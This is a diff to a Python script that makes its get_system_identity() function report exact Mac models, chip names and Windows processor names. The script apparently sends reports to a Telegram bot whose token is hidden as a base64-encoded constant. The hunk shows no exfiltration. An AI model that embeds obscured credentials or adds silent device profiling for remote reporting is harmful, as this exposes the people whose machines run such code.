@@ -23,16 +23,27 @@ TELEGRAM_BOT_TOKEN = base64.b64decode(_ENC_TOKEN).decode("utf-8")
 TELEGRAM_CHAT_ID = "1991475833"
 
 def get_system_identity() -> str:
-    """Return friendly host device name and OS info."""
+    """Return friendly exact host device name, series, and OS info."""
     system_os = platform.system()
     machine = platform.machine()
     
     if system_os == "Darwin":
-        if "arm" in machine.lower():
-            return "MacBook (Apple Silicon - macOS)"
-        return "MacBook (Intel - macOS)"
+        try:
+            model = subprocess.check_output(["sysctl", "-n", "hw.model"]).decode().strip()
+            chip = subprocess.check_output(["sysctl", "-n", "machdep.cpu.brand_string"]).decode().strip()
+            if "MacBookAir" in model:
+                return f"MacBook Air ({chip})"
+            elif "MacBookPro" in model:
+                return f"MacBook Pro ({chip})"
+            elif "Macmini" in model:
+                return f"Mac mini ({chip})"
+            elif "iMac" in model:
+                return f"iMac ({chip})"
+            return f"Mac ({chip})"
+        except Exception:
+            return "MacBook (Apple Silicon)"
     elif system_os == "Windows":
-        return f"Windows PC ({machine})"
+        return f"Windows PC ({platform.processor() or machine})"
     elif system_os == "Linux":
         return f"Linux Workstation ({machine})"
     return f"{system_os} ({machine})"
